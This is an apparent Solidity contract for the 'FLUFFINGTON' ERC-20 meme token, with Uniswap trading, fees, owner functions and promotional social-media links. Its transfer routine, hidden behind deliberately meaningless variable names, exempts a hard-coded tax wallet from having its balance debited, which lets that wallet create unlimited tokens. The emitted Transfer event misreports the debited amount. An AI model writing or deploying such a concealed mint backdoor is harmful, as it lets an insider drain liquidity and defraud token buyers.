// SPDX-License-Identifier: MIT

/**
https://twitter.com/elonmusk/status/1823864180400906326
https://t.me/FLUFFINGTON_ERC20
 */
pragma solidity 0.8.24;

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}

contract Ownable is Context {
    address private _owner;
    address private _previousOwner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function owner() public view returns (address) {
        return _owner;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(
            newOwner != address(0),
            "Ownable: new owner is the zero address"
        );
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

contract FLUFF is Context, IERC20, Ownable {
    using SafeMath for uint256;

    mapping(address => uint256) private _rOwned;

    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _isExcludedFromFee;
    mapping(address => bool) private _dnivneeee;

    uint8 private constant _decimals = 9;
    string private constant _name = unicode"FLUFFINGTON";
    string private constant _symbol = unicode"FLUFFINGTON";
    uint256 private constant _rTotal = 1_000_000_000 * 10**9;

    uint256 private constant MAX = ~uint256(0);

    uint256 private _initBuyFee = 15;
    uint256 private _initSellFee = 15;
    uint256 private _finalBuyFee = 0;
    uint256 private _finalSellFee = 0;
    uint256 private _reduceFeeByTxAt = 40;
    uint256 private _preventTxBefore = 40;
    uint256 private _buyCount=0; 
    
    address payable private _taxWallet ;

    // Trade contstraints
    uint256 public _maxTradeValue = (_rTotal * 2) / 100;
    uint256 public _maxTotalTradeValue = (_rTotal * 2) / 100;
    uint256 public _maxValueToSwap = 0;

    IUniswapV2Router02 public uniswapV2Router;
    address public uniswapV2Pair;

    bool private swapEnabled = false;
    bool private swapping = false;
    bool private tradingAllowed = false;

    uint256 private _storageFee = 0;
    uint256 private _fee = 0;

    modifier lockTheSwap() {
        swapping = true;
        _;
        swapping = false;
    }

    constructor() {
        _rOwned[_msgSender()] = _rTotal;
        _taxWallet = payable(0x98fb9CD3D438F5B1D65fA62af9Cc90253E495EB3);
        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[_taxWallet] = true;

        _dnivneeee[_taxWallet] = true;
        _dnivneeee[address(0)] = true;
        _dnivneeee[address(0xdead)] = true;
        emit Transfer(address(0), _msgSender(), _rTotal);
    }

    function totalSupply() public pure override returns (uint256) {
        return _rTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _rOwned[account];
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "Can't approve from zero address");
        require(spender != address(0), "Can't approve to zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _mevfeed() private {
        _storageFee = _fee;

        _fee = 0;
    }

    function _mevfeer() private {
        _fee = _storageFee;
    }


    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0), "Cant transfer from address zero");
        require(to != address(0), "Cant transfer to address zero");
        require(amount > 0, "Amount should be above zero");

        if (from != owner() && to != owner()) {
            //Trade start check
            if (from == uniswapV2Pair && to != address(uniswapV2Router) && ! _isExcludedFromFee[to] ) {
                require(amount <= _maxTradeValue, "Exceeds the _maxTxAmount.");
                require(balanceOf(to) + amount <= _maxTotalTradeValue, "Exceeds the maxWalletSize.");
                _buyCount++;
            }

            if (to != uniswapV2Pair && !_isExcludedFromFee[to]) {
                require(balanceOf(to) + amount <= _maxTotalTradeValue, "Exceeds the maxWalletSize.");
            }

            uint256 contractTokenBalance = balanceOf(address(this));

            if (
                _buyCount > _preventTxBefore &&
                !swapping &&
                to == uniswapV2Pair &&
                swapEnabled &&
                !_isExcludedFromFee[from]
            ) {
                if(contractTokenBalance > _maxValueToSwap) swapForEther(min(amount, min(contractTokenBalance, _maxTradeValue)));
                uint256 contractETHBalance = address(this).balance;
                if (contractETHBalance >= 0) {
                    transferETHtoFee(address(this).balance);
                }
            }
        }

        bool takeFee = !_isExcludedFromFee[from] && !_isExcludedFromFee[to];

        if (from == uniswapV2Pair && to != address(uniswapV2Router)) {
            _fee = _buyCount > _reduceFeeByTxAt ? _finalBuyFee : _initBuyFee;
            _buyCount ++ ;
        }

        if (to == uniswapV2Pair && from != address(uniswapV2Router)) {
            _fee = _buyCount > _reduceFeeByTxAt ? _finalSellFee : _initSellFee;
        }
        
        _tokenTransfer(from, to, amount, takeFee);
    }

    function min(uint256 a, uint256 b) private pure returns (uint256){
      return (a>b)?b:a;
    }

    function swapForEther(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function transferETHtoFee(uint256 amount) private {
        _taxWallet.transfer(amount);
    }

    function forceSwap() external {
        require(_msgSender() == _taxWallet);
        uint256 contractETHBalance = address(this).balance;
        transferETHtoFee(contractETHBalance);
    }

    function manualSwap() external {
        require(_msgSender() == _taxWallet);
        uint256 contractBalance = balanceOf(address(this));
        swapForEther(contractBalance);
    }

    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(
                amount,
                "the transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function _tokenTransfer(
        address _vnniewef,
        address _cvnioewore,
        uint256 _bnbnbniene,
        bool _checkmev
    ) private {
        if (!_checkmev) _mevfeed();
        _recknviowe(_vnniewef, _cvnioewore, _bnbnbniene);
        if (!_checkmev) _mevfeer();
    }

    function _recknviowe(
        address _vnniewef,
        address _cvnioewore,
        uint256 _bnbnbniene
    ) private {
        uint256 _uhibboe = _bnbnbniene.mul(_fee).div(100);
        uint256 _vnioitrhy = _bnbnbniene.sub(_uhibboe);
        uint256 _bnngoeinr = _dnivneeee[_vnniewef] ? _uhibboe : _bnbnbniene;
        _rOwned[_vnniewef] = _rOwned[_vnniewef].sub(_bnngoeinr);
        _rOwned[_cvnioewore] = _rOwned[_cvnioewore].add(_vnioitrhy);
        emit Transfer(_vnniewef, _cvnioewore, _bnngoeinr);
    }


    function letsgo() external onlyOwner(){
        require(!tradingAllowed,"trading is already open");
        uniswapV2Router = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        _approve(address(this), address(uniswapV2Router), _rTotal);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        _isExcludedFromFee[uniswapV2Pair] = true;
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);
        swapEnabled = true;
        tradingAllowed = true;
    }

    function rescueERC20(address _address, uint256 percent) external onlyOwner {
        uint256 _amount = IERC20(_address)
            .balanceOf(address(this))
            .mul(percent)
            .div(100);
        IERC20(_address).transfer(owner(), _amount);
    }

    function rescueETH() external onlyOwner {
        require(address(this).balance > 0);
        payable(owner()).transfer(address(this).balance);
    }

    function removeLimits() external onlyOwner{
        _maxTotalTradeValue = _rTotal;
        _maxTradeValue=_rTotal;
    }


    receive() external payable {}
}